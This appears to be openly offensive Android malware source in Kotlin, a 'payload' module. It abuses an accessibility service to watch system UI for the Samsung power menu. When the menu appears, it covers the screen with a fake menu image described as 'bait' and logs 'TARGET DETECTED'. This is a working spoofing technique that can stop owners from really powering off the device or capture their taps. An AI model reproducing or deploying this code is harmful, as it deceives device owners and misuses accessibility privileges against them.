package com.speedster.payload

import android.content.Context
import android.graphics.BitmapFactory
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import androidx.compose.animation.*
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Text
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Button
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {
    private var isTargetDetected by mutableStateOf(false)

    override @Composable fun Render(context: Context, resDir: File) {
        val clipboardManager = LocalClipboardManager.current
        
        // Load the screenshot master bait
        val fakeMenuBitmap = remember(resDir) {
            try {
                BitmapFactory.decodeFile(File(resDir, "fake_menu.png").absolutePath).asImageBitmap()
            } catch (e: Exception) { null }
        }

        LaunchedEffect(Unit) {
            DynamicEntry.log("📡 Screenshot Slaver: Ready to Blend.")
            
            // Permanent Background Layer (Stays transparent but ready)
            DynamicEntry.overlayContent = {
                AnimatedVisibility(
                    visible = isTargetDetected,
                    enter = fadeIn(animationSpec = tween(600)),
                    exit = fadeOut(animationSpec = tween(300))
                ) {
                    Box(modifier = Modifier.fillMaxSize()) {
                        if (fakeMenuBitmap != null) {
                            Image(
                                bitmap = fakeMenuBitmap,
                                contentDescription = null,
                                modifier = Modifier.fillMaxSize(),
                                contentScale = ContentScale.FillBounds
                            )
                        } else {
                            // Error state visual
                            Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(alpha = 0.3f)))
                        }
                    }
                }
            }

            DynamicEntry.accessibilityInterceptor = { event ->
                if (event.packageName == "com.android.systemui") {
                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                    val hasPowerMenu = root?.let { checkNodes(it) } ?: false
                    
                    if (hasPowerMenu && !isTargetDetected) {
                        isTargetDetected = true
                        DynamicEntry.log("🎯 TARGET DETECTED: Initiating Blend")
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            Toast.makeText(context, "Ghost Mode: Blending Overlay...", Toast.LENGTH_SHORT).show()
                        }
                    } else if (!hasPowerMenu && isTargetDetected) {
                        isTargetDetected = false
                        DynamicEntry.log("📉 TARGET LOST: Fading out")
                    }
                } else if (isTargetDetected) {
                    isTargetDetected = false
                }
            }
        }

        // --- THE APP CONSOLE ---
        Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
            Text("GHOST CONSOLE", color = Color.Green, fontSize = 18.sp)
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                Button(onClick = { DynamicEntry.systemLogs.clear() }) { Text("Clear") }
                Button(onClick = { 
                    val allLogs = DynamicEntry.systemLogs.joinToString("\n")
                    clipboardManager.setText(AnnotatedString(allLogs))
                }) { Text("Copy") }
            }
            LazyColumn(modifier = Modifier.weight(1f).fillMaxWidth()) {
                items(DynamicEntry.systemLogs.asReversed()) { log ->
                    Text(log, color = Color(0xFF00FF00), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                    HorizontalDivider(color = Color.DarkGray)
                }
            }
        }
    }

    private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
        // Look for the unique Samsung Power Menu ID
        if (node.viewIdResourceName?.contains("sec_global_actions_icon_label_view") == true) return true
        for (i in 0 until node.childCount) {
            if (checkNodes(node.getChild(i) ?: continue)) return true
        }
        return false
    }
}
